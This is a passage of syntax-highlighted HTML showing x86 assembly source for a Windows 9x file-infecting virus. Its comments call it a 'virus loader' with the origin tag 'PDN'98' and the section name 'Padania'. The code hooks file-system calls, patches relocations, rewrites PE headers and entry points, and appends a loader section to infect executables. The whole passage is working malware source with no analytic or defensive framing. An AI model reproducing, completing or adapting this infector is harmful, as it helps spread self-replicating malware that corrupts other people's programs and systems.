        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; end of relocs??</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">change_in_pe</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">rel_pos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">           </span><span class="sc1">; 32bit relocation?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">another_reloc</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; away reloc type</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; find the first one after the orig EIP</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">another_reloc</span><span class="sc0">   </span><span class="sc1">; or just the next one if previous was bad</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; sorta rnd to select if use this one or no..</span><span class="sc0">
</span><span class="sc5">no_good</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; so about 50% probability to use this..</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">another_reloc</span><span class="sc0">

</span><span class="sc1">; so EAX has offset to the reloc we want to change</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; RVA in mem</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; on next instruction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jmp_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">mid_jmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">entry_point</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">return_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">objname</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; physical offset</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; two bytes before the relocated addr</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d600h</span><span class="sc0">                      </span><span class="sc1">; read the orig instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">orig_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">objname</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">             </span><span class="sc1">; probable 2 byte one?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_our_two</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">068h</span><span class="sc0">           </span><span class="sc1">; push xxxx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">another_reloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">      </span><span class="sc1">; pad with nop the orig instruction</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; so must write one byte later</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ok_instru</span><span class="sc0">

</span><span class="sc5">check_our_two</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; so one more byte to write</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">015h</span><span class="sc0">           </span><span class="sc1">; call [xxxx]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_twob</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">035h</span><span class="sc0">           </span><span class="sc1">; push [xxxx]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">another_reloc</span><span class="sc0">
</span><span class="sc5">ok_twob</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_instru</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">jmp_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">mid_jmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d601h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">end_jump</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">objname</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rewrite_header</span><span class="sc0">

</span><span class="sc5">change_in_pe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">end_jump</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">objname</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">jmp_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; set new eip</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oldeiprva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">objname</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; save old eip</span><span class="sc0">

</span><span class="sc5">rewrite_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; objects</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">obj_size</span><span class="sc0">                     </span><span class="sc1">; + PE + virus loader</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; write just the needed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; rewrite header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d601h</span><span class="sc0">                              </span><span class="sc1">; write to file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

</span><span class="sc5">closefile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

</span><span class="sc5">exitvvxd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; attribs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; pointer to filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

</span><span class="sc5">exitvvxd_noatt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">chktsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">letOrginal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">            </span><span class="sc1">; mov eax,</span><span class="sc0">
</span><span class="sc5">oldfsd</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000018h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; This is the new object and the virus loader code that will be placed just</span><span class="sc0">
</span><span class="sc1">; after the objects. the loader is put in this part of memory, because the</span><span class="sc0">
</span><span class="sc1">; c0000000 can't be written once it has already been, so it is very risky</span><span class="sc0">
</span><span class="sc1">; putting the loader there</span><span class="sc0">

</span><span class="sc5">object_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">objname</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Padania "</span><span class="sc0">
</span><span class="sc5">virtualsize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc0">
</span><span class="sc5">obj_rva</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">phy_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">phy_offs</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">needed_zero</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Character</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0c0000040h</span><span class="sc0">

</span><span class="sc5">entry_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">chktsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; already tsr?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getout</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc3">"'NDP"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getout</span><span class="sc0">                  </span><span class="sc1">; be sure it is our own code up there</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">here</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">starthigh</span><span class="sc0">                       </span><span class="sc1">; jump up to virus code</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">getout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">end_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">from_pe</span><span class="sc0">                         </span><span class="sc1">; will jump depending on the</span><span class="sc0">
</span><span class="sc5">from_pe</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; type of infection done</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0b8h</span><span class="sc0">                   </span><span class="sc1">; mov eax</span><span class="sc0">
</span><span class="sc5">oldeiprva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; here is loader execd from PE</span><span class="sc0">

</span><span class="sc5">from_executable</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">orig_code</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PDN'98"</span><span class="sc0">                </span><span class="sc1">; 6 bytes used for orig code</span><span class="sc0">
                        </span><span class="sc1">; when overwriting some code with the jump to the virus</span><span class="sc0">
                        </span><span class="sc1">; will be changed on infection. this 6 bytes also</span><span class="sc0">
                        </span><span class="sc1">; carries virus origin ;)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">            </span><span class="sc1">; jump back when placing loader</span><span class="sc0">
</span><span class="sc5">return_addr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; in the middle of the code</span><span class="sc0">
</span><span class="sc5">end_loader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">mid_jmp</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">            </span><span class="sc1">; temp code for the mid jmp gen</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; end of virus on disk </span><span class="sc0">

</span><span class="sc5">jmp_addr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">chktsr</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
 
</span><span class="sc5">peptr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">relocs</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">208h</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rel_pos</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vxdoff</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
